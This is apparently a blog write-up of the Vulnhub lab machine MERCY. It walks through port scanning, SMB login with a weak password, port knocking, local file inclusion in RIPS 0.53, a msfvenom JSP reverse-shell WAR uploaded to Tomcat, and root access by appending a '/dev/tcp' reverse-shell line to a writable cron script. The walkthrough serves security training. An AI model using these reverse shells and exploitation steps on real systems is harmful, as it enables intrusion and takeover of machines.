---
title: "Mercy"
date: 2022-04-13T16:11:47+08:00
draft: true
tags: ["Vulnhub"]
---

MERCY is a machine dedicated to Offensive Security for the PWK course. MERCY is a name-play on some aspects of the PWK course. It is NOT a hint for the box.

MERCY is a VirtualBox VM built, but I host it on Proxmox Server. To get the VM image, click [here](https://www.vulnhub.com/entry/digitalworldlocal-development,280/).

Feel free to contact the author at https://donavan.sg/blog if you would like to drop a comment.

> The machine IP address is `192.168.50.111` for me, yours will be different. Do scan your network before proceeding with the attack. Do snapshot the machine before proceeding, in case we need to revert it once we are finish or we mess up the machine.

## Scanning 

```
# Nmap 7.92 scan initiated Wed Apr 13 03:39:13 2022 as: nmap -sS -p- -oN initial.scan 192.168.50.111
Nmap scan report for 192.168.50.111
Host is up (0.0025s latency).
Not shown: 65525 closed tcp ports (reset)
PORT     STATE    SERVICE
22/tcp   filtered ssh
53/tcp   open     domain
80/tcp   filtered http
110/tcp  open     pop3
139/tcp  open     netbios-ssn
143/tcp  open     imap
445/tcp  open     microsoft-ds
993/tcp  open     imaps
995/tcp  open     pop3s
8080/tcp open     http-proxy
```

From the scan, it tells us that several ports is open/filtered: 

- SSH = Port 22 (Filtered)
- DNS = Port 53 
- HTTP = Port 80 (Filtered) and Port 8080
- POP3 = Port 110 and 995 
- Samba = Port 139 and 445
- Imaps = Port 993

Port 22 and 80 is filtered. Most probably I need to find some type of file to open it. 

## Enumeration 

#### Port 8080 (HTTP Tomcat)

Navigating to this site, we are welcomed with a default Tomcat page. Tried to log in to both `manager` and `host-manager` site with default credential but it didnt work. Next i check if the site has `/robots.txt` and it leads me to `/tryharder/tryharder`. 

Moving to `http://ipaddress:8080/tryharder/tryharder` shows me a base64 text. Lets copy the base64 to the terminal and decode it: 

```
echo -n SXQncyBhbm5veWluZywgYnV0IHdlIHJlcGVhdCB0aGlzIG92ZXIgYW5kIG92ZXIgYWdhaW46IGN5YmVyIGh5Z2llbmUgaXMgZXh0cmVtZWx5IGltcG9ydGFudC4gUGxlYXNlIHN0b3Agc2V0dGluZyBzaWxseSBwYXNzd29yZHMgdGhhdCB3aWxsIGdldCBjcmFja2VkIHdpdGggYW55IGRlY2VudCBwYXNzd29yZCBsaXN0LgoKT25jZSwgd2UgZm91bmQgdGhlIHBhc3N3b3JkICJwYXNzd29yZCIsIHF1aXRlIGxpdGVyYWxseSBzdGlja2luZyBvbiBhIHBvc3QtaXQgaW4gZnJvbnQgb2YgYW4gZW1wbG95ZWUncyBkZXNrISBBcyBzaWxseSBhcyBpdCBtYXkgYmUsIHRoZSBlbXBsb3llZSBwbGVhZGVkIGZvciBtZXJjeSB3aGVuIHdlIHRocmVhdGVuZWQgdG8gZmlyZSBoZXIuCgpObyBmbHVmZnkgYnVubmllcyBmb3IgdGhvc2Ugd2hvIHNldCBpbnNlY3VyZSBwYXNzd29yZHMgYW5kIGVuZGFuZ2VyIHRoZSBlbnRlcnByaXNlLg==' | base64 -d

It's annoying, but we repeat this over and over again: cyber hygiene is extremely important. Please stop setting silly passwords that will get cracked with any decent password list.

Once, we found the password "password", quite literally sticking on a post-it in front of an employee's desk! As silly as it may be, the employee pleaded for mercy when we threatened to fire her.

No fluffy bunnies for those who set insecure passwords and endanger the enterprise.
```

Reading the story, I know that the workers in the company commonly use their password as `password`. 

#### Port 139 and 445 (Samba) 

Heading to samba next, I start off with listing share folder: 

```
smbclient -L \\\\192.168.50.111\\        
Enter WORKGROUP\kali's password: 

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	qiu             Disk      
	IPC$            IPC       IPC Service (MERCY server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.
```

There's a shared folder called `qiu`. Trying to access it anonymously will not work. Somehow i know that the shared folder name is also a potential username, i log in with `qiu` with the password of `password`: 

```
smbclient -U qiu \\\\192.168.50.111\\qiu
Enter WORKGROUP\qiu's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Aug 31 15:07:00 2018
  ..                                  D        0  Mon Nov 19 11:59:09 2018
  .bashrc                             H     3637  Sun Aug 26 09:19:34 2018
  .public                            DH        0  Sun Aug 26 10:23:24 2018
  .bash_history                       H      163  Fri Aug 31 15:11:34 2018
  .cache                             DH        0  Fri Aug 31 14:22:05 2018
  .private                           DH        0  Sun Aug 26 12:35:34 2018
  .bash_logout                        H      220  Sun Aug 26 09:19:34 2018
  .profile                            H      675  Sun Aug 26 09:19:34 2018
  		19213004 blocks of size 1024. 16329116 blocks available
smb: \>
```

And we got a hit! Navigate to `.private` folder, we have `readme.txt` and `opensesame` directory. Inside the directory we have 2 more files that we can download. Lets download this file and view it. 

```
cat readme.txt 
This is for your own eyes only. In case you forget the magic rules for remote administration.

less config
Here are settings for your perusal.

Port Knocking Daemon Configuration

[options]
        UseSyslog

[openHTTP]
        sequence    = 159,27391,4
        seq_timeout = 100
        command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 80 -j ACCEPT
        tcpflags    = syn

[closeHTTP]
        sequence    = 4,27391,159
        seq_timeout = 100
        command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 80 -j ACCEPT
        tcpflags    = syn

[openSSH]
        sequence    = 17301,28504,9999
        seq_timeout = 100
        command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
        tcpflags    = syn

[closeSSH]
        sequence    = 9999,28504,17301
        seq_timeout = 100
        command     = /sbin/iptables -D iNPUT -s %IP% -p tcp --dport 22 -j ACCEPT
        tcpflags    = syn
```

Nice! From the `readme.txt`, we can tell that this file is meant to be a secret and its for remote adminstration. Reading `config` file show us how to open both Port 22 and 80. Lets open the Port so we can progress our enumeration: 

```
┌──(kali㉿kali)-[~/Vulnhub/Mercy]
└─$ knock 192.168.50.111 159 27391 4

┌──(kali㉿kali)-[~/Vulnhub/Mercy]
└─$ knock 192.168.50.111 17301 28504 9999
                                                                                                                                                            
┌──(kali㉿kali)-[~/Vulnhub/Mercy]
└─$ sudo nmap -sS -p- 192.168.50.111 -oN afterKnock.scan 
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-13 07:38 EDT
Nmap scan report for 192.168.50.111
Host is up (0.0029s latency).
Not shown: 65525 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain
80/tcp   open  http
110/tcp  open  pop3
139/tcp  open  netbios-ssn
143/tcp  open  imap
445/tcp  open  microsoft-ds
993/tcp  open  imaps
995/tcp  open  pop3s
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 4.27 seconds
```

And both Port 22 and 80 that was filtered earlier, is now open.

#### Port 80 (HTTP)

Navigating to `http://ipaddress` will bring us to a static page saying: 

`This machine shall make you plead for mercy! Bwahahahaha!`.

Checking the `/robots.txt` in the URL shows that we can access to 2 directories: 

- /mercy (Just another static page)
- /nomercy

Heading to `http://ipaddress/nomercy` will bring us to a RIPS version 0.53 web page.

{{<image src="/Mercy/1.png" position="center" style="border-radius: 8px;">}}

Since now we know that the web page is running RIPS 0.53, I can search for vulnerability in searchsploit. Reading this vulnerability tell us that this static source code anaylzer is vulnerable to Multiple Local File Inclusion. I can achieve LFI from both `code.php` and `function.php`. More of it can be read here: https://www.exploit-db.com/exploits/18660

Navigating to `/windows`, I can see that we have those 2 files.

{{<image src="/Mercy/2.png" position="center" style="border-radius: 8px;">}}

Lets test it out with `code.php` by reading `/etc/passwd` file: 

{{<image src="/Mercy/3.png" position="center" style="border-radius: 8px;">}}

Nice it work! Take down potential username that we could use to log in later. 

Now that we have LFI, the next step I'll do is to find the credential for Tomcat so that i could log in. Reading the default Tomcat home page, its mentioned that users are defined in `/etc/tomcat7/tomcat-users.xml`. Lets LFI to that file: 

{{<image src="/Mercy/4.png" position="center" style="border-radius: 8px;">}}

We got 2 users and passwords but only 1 user can log in to the Tomcat due to the roles given. Username and Password found so far: 

| Username | Password |
| ---------|----------|
| thisisasuperduperlonguser | heartbreakisinevitable |
| fluffy | freakishfluffybunny | 
| qiu | password |

#### Back to Port 8080 (HTTP Tomcat)

Now that we have the credentials, lets login to the Tomcat Manager. Upon successfully log in, we can see this page: 

{{<image src="/Mercy/5.png" position="center" style="border-radius: 8px;">}}

## Initial Foothold

I going to craft the WAR payload using msfvenom to upload it in the Tomcat Manager:

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.2 LPORT=1234 -f war > shell.war
Payload size: 1101 bytes
Final size of war file: 1101 bytes
```

Once done, upload the WAR file. It should appear in the `Application` section. 

{{<image src="/Mercy/6.png" position="center" style="border-radius: 8px;">}}

Set up a `nc` listener and click on the `/shell` that is located inside the `Applications`. We now have a shell as tomcat! Let's stable the shell before moving forward. 

```
┌──(kali㉿kali)-[~/Vulnhub/Mercy]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.10.2] from (UNKNOWN) [192.168.50.111] 41252
id                         
uid=116(tomcat7) gid=126(tomcat7) groups=126(tomcat7)
which python3 
/usr/bin/python3
python3 -c 'import pty;pty.spawn("/bin/bash")'
tomcat7@MERCY:/var/lib/tomcat7$ export TERM=xterm
export TERM=xterm
tomcat7@MERCY:/var/lib/tomcat7$ ^Z
zsh: suspended  nc -lvnp 1234
                                                                                                                                                            
┌──(kali㉿kali)-[~/Vulnhub/Mercy]
└─$ stty raw -echo; fg                                                                                                                            148 ⨯ 1 ⚙
[1]  + continued  nc -lvnp 1234

tomcat7@MERCY:/var/lib/tomcat7$ 
```

## Privileged Escalation

#### Tomcat7 to Fluffy

Remember fluffy password from the tomcat credential? Yeah we can use that password to switch to `fluffy`. Upon changing, we are using `sh` shell. We can change it to `bash` by simply using the `chsh` command:

```
tomcat7@MERCY:/var/lib/tomcat7$ su fluffy
Password: 
$ chsh
Password: 
Changing the login shell for fluffy
Enter the new value, or press ENTER for the default
	Login Shell [/bin/sh]: /bin/bash
$ exit
tomcat7@MERCY:/var/lib/tomcat7$ su fluffy
Password: 
fluffy@MERCY:/var/lib/tomcat7$
```

#### Fluffy to Root 

In `fluffy` home dir, there's a file called `timeclock` inside `/.private/secrets`. Viewing `timeclock` show us that its running some kind of script that will `echo` the `date` command and store it at `/var/www/html/time`. Every 3 mins the file will get overwrite. I believe there's crontab running as root. As `fluffy`, I can edit the file too.

```
fluffy@MERCY:~$ ls -la
total 16
drwxr-x--- 3 fluffy fluffy 4096 Nov 20  2018 .
drwxr-xr-x 6 root   root   4096 Nov 20  2018 ..
-rw------- 1 fluffy fluffy  312 Aug  5 00:52 .bash_history
drwxr-xr-x 3 fluffy fluffy 4096 Nov 20  2018 .private
fluffy@MERCY:~$ cd .private/
fluffy@MERCY:~/.private$ ls -la
total 12
drwxr-xr-x 3 fluffy fluffy 4096 Nov 20  2018 .
drwxr-x--- 3 fluffy fluffy 4096 Nov 20  2018 ..
drwxr-xr-x 2 fluffy fluffy 4096 Aug  4 21:36 secrets
fluffy@MERCY:~/.private$ cd secrets/
fluffy@MERCY:~/.private/secrets$ ls -la
total 24
drwxr-xr-x 2 fluffy fluffy 4096 Aug  4 21:36 .
drwxr-xr-x 3 fluffy fluffy 4096 Nov 20  2018 ..
-rwxr-xr-x 1 fluffy fluffy   37 Nov 20  2018 backup.save
-rw-r--r-- 1 fluffy fluffy   12 Nov 20  2018 .secrets
-rwxrwxrwx 1 root   root    263 Aug  4 21:36 timeclock
fluffy@MERCY:~/.private/secrets$ cat timeclock
#!/bin/bash

now=$(date)
echo "The system time is: $now." > ../../../../../var/www/html/time
echo "Time check courtesy of LINUX" >> ../../../../../var/www/html/time
chown www-data:www-data ../../../../../var/www/html/time
fluffy@MERCY:~/.private/secrets$ cat /var/www/html/time
The system time is: Thu Aug  5 01:00:01 +08 2021.
Time check courtesy of LINUX
fluffy@MERCY:~/.private/secrets$ date
Thu Aug  5 01:01:51 +08 2021
fluffy@MERCY:~/.private/secrets$
``` 

So to exploit this, I just have to add `bash -i >& /dev/tcp/10.10.10.2/1235 0>&1` to the `timeclock` file, set up a `nc` listener and wait for 3 mins. 

```
echo "bash -i >& /dev/tcp/10.10.10.2/1235 0>&1" >> timeclock 

# On my terminal 
nc -lvnp 1235 
listening on [any] 1235 ...

# Wait for 3 mins and we get shell
connect to [10.10.10.2] from (UNKNOWN) [192.168.50.111] 51418
bash: cannot set terminal process group (5008): Inappropriate ioctl for device
bash: no job control in this shell
root@MERCY:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@MERCY:~# ls /root
ls /root
author-secret.txt
config
proof.txt
root@MERCY:~# cat /root/proof.txt
cat /root/proof.txt
Congratulations on rooting MERCY. :-)
root@MERCY:~# 
```

## Summary 

I would say this machine is quite fun. The idea of bouncing around and port knocking does make someone think on what to do next. I did enumerate the other ports such as DNS, POP3 and Imaps but i didn't get anything from it. Of course, I almost got into a rabbit hole if `RollofDeath` didn't stop me. Overall, it was a fun box. I learn a lot from it. 2 more of this machine and Im sadly done with the series. See you in the next post! 


















